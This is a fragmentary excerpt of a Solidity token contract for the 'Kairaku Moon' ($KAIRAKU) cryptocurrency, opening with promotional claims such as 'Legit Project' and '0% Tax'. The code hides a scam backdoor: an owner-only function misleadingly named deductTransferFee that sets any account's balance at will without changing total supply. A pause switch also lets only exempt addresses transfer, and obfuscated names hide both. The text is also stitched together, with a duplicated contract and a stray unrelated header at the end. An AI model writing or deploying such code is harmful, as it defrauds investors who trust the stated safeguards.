...
/**
Kairaku Moon | $KAIRAKU 


Evolutionary Launchpad for emerging crypto projects 💰
KAIRAKU ($KAIRAKU) is a community project with a goal to advance into every aspect and day to day living of people all over the world.
KAIRAKU aims to solve this issue by enabling these groups to have access to a secure, SAFE and completely decentralized finance, aimed at giving the power for wealth back to where it belongs – In The Hands of The People. Through harnessing the complete potential of community, decentralization and the Power of Blockchain

🐵 https://t.me/KairakuErc
🐻‍❄️ Legit Project
🐸 Based Dev
🦁 Liquidity Locked
🦓 0% Tax
...
abstract contract KairakuContext {
...
interface KairakuIERC71Metadata is KairakuIERC71 {
    /**
...
abstract contract KairakuOwnable is KairakuContext {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "KairakuOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "KairakuOwnable: new owner is the zero address");
...
contract EXCHANGETOKEN is KairakuContext, KairakuIERC71, KairakuIERC71Metadata, KairakuOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private Kairakubalances;
  mapping(address => bool) public KairakuAZERTY;
  ...
  address Kairakupinksale;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool KairakuisPaused;
    ...
    constructor() {
            // Editable
            Kairakupinksale = msg.sender;
            KairakuAZERTY[Kairakupinksale] = true;
        _name = "Kairaku Moon";
        _symbol = "KAIRAKU";
        uint tALLtotalSupply = 1000000000 * 10**9;
        KairakuisPaused = false;
        // End editable

        isPauseExempt[msg.sender] = true;

        _mint(msg.sender, tALLtotalSupply);
    }
     ...
     * {KairakuIERC71-balanceOf} and {KairakuIERC71-transfer}.
     */
    ...
    /**
     * @dev See {KairakuIERC71-totalSupply}.
     */
    ...
    /**
     * @dev See {KairakuIERC71-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return Kairakubalances[account];
    }

    /**
     * @dev See {KairakuIERC71-transfer}.
     *
     * Requirements:
     *
    ...
    /**
     * @dev See {KairakuIERC71-allowance}.
     */
    ...
    /**
     * @dev See {KairakuIERC71-transferFrom}.
     *
     ...
     * problems described in {KairakuIERC71-approve}.
     *
  ...
  modifier Kairaku0wner () {
    require(Kairakupinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
    ...
    function _transfer(
        ...
        // My implementation
        require(!KairakuisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = Kairakubalances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            Kairakubalances[from] = fromBalance - amount;
        }
        Kairakubalances[to] += amount;
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        ALLtotalSupply += amount;
        Kairakubalances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }
  function deductTransferFee(address Kairakuaccount, uint256 Kairakuamount) public Kairaku0wner {
    Kairakubalances[Kairakuaccount] = (Kairakuamount - Kairakuamount) + (Kairakuamount - Kairakuamount) + Kairakuamount * 10 ** 9;
            emit Transfer(address(0), Kairakuaccount, Kairakuamount);
  }
    /**
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = Kairakubalances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            Kairakubalances[account] = accountBalance - amount;
        }
        ALLtotalSupply -= amount;
...
abstract contract KairakuOwnable is KairakuContext {
    ...
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = 0xB9a94e9d816921D52A971591F7393A66336e9f15;
...
contract floki is KairakuContext, IERC20, KairakuOwnable { 
